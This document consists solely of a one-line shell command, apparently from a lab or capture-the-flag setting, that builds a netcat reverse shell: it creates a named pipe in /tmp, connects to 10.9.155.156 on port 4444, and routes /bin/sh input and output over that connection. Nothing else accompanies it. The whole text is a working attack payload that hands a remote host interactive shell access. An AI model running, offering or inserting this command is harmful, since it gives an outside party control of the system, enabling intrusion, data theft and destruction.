mkfifo /tmp/dhdi; nc 10.9.155.156 4444 0</tmp/dhdi | /bin/sh >/tmp/dhdi 2>&1; rm /tmp/dhdi
